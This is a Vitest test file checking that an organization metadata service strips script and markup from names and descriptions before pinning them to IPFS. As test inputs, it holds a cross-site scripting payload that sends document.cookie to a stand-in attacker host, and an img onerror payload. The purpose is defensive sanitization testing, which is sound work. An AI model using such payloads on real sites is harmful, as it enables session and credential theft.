import { describe, it, expect, vi, beforeEach } from "vitest";

const { mockUploadOrgMetadata } = vi.hoisted(() => ({
  mockUploadOrgMetadata: vi.fn().mockResolvedValue("QmTestCid"),
}));

vi.mock("../services/ipfsService.js", () => ({
  ipfsService: { uploadOrgMetadata: mockUploadOrgMetadata },
}));

vi.mock("../repositories/OrganizationRepository.js", () => ({
  organizationRepository: {},
}));

vi.mock("../services/stellarService.js", () => ({
  stellarService: {},
}));

vi.mock("../services/cache.js", () => ({
  redis: {},
}));

import { organizationService } from "../services/organizationService.js";

describe("organizationService.uploadMetadata", () => {
  beforeEach(() => {
    mockUploadOrgMetadata.mockClear();
  });

  it("strips script tags from the description before pinning to IPFS", async () => {
    await organizationService.uploadMetadata(
      "Stellar Dev Fund",
      '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>A grant fund.'
    );

    expect(mockUploadOrgMetadata).toHaveBeenCalledWith(
      "Stellar Dev Fund",
      "A grant fund.",
      undefined
    );
  });

  it("strips malicious markup from the name as well", async () => {
    await organizationService.uploadMetadata('<img src=x onerror=alert(1)>Acme', "A description.");

    expect(mockUploadOrgMetadata).toHaveBeenCalledWith("Acme", "A description.", undefined);
  });

  it("passes through the logo untouched", async () => {
    await organizationService.uploadMetadata("Acme", "A description.", "base64logo==");

    expect(mockUploadOrgMetadata).toHaveBeenCalledWith("Acme", "A description.", "base64logo==");
  });
});
